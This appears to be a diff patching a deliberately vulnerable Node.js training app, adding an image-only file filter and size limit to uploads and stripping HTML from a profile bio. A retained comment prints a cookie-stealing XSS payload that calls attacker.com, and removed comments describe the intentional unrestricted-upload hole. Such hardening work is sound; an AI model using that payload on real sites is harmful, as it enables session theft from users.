@@ -13,23 +13,26 @@ const path    = require('path');
 const db      = require('../db');
 const { verifyToken } = require('../middleware/auth');
 
-// ── Multer File Upload Configuration ─────────────────────────────────────────
-// DELIBERATE (V-05): No fileFilter — accepts ALL file types including:
-//   - .html, .js (XSS via direct file access)
-//   - .sh, .php equivalents
-//   - Files with double extensions: image.jpg.html
+const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
+
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, '/app/uploads/'),
+  destination: (req, file, cb) => cb(null, '/uploads/'),
   filename: (req, file, cb) => {
-    // DELIBERATE: Preserves original file extension (no sanitization)
     const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
     cb(null, uniqueSuffix + path.extname(file.originalname));
   }
 });
 
 const upload = multer({
-  storage: storage
-  // DELIBERATE: No limits, no fileFilter — accepts any file (V-05)
+  storage: storage,
+  fileFilter: (req, file, cb) => {
+    const ext = path.extname(file.originalname).toLowerCase();
+    if (!ALLOWED_EXTENSIONS.includes(ext)) {
+      return cb(new Error('Only image files are allowed (jpg, jpeg, png, gif, webp)'));
+    }
+    cb(null, true);
+  },
+  limits: { fileSize: 5 * 1024 * 1024 }
 });
 
 // ── GET /api/users/profile ────────────────────────────────────────────────────
@@ -73,9 +76,10 @@ router.put('/profile', verifyToken, async (req, res) => {
     // Attacker payload: bio = <script>fetch('http://attacker.com/?c='+document.cookie)</script>
     // FIX (Phase 5): Sanitize input with DOMPurify/sanitize-html before storing
     // ───────────────────────────────────────────────────────────────────────
+    const safeBio = bio ? bio.replace(/<[^>]*>/g, '').trim() : '';
     const result = await db.query(
       'UPDATE users SET name = $1, bio = $2 WHERE id = $3 RETURNING id, name, email, role, bio',
-      [name, bio, req.user.id]  // bio stored raw — no sanitization
+      [name, safeBio, req.user.id]
     );
     res.json({ message: 'Profile updated', user: result.rows[0] });
   } catch (err) {
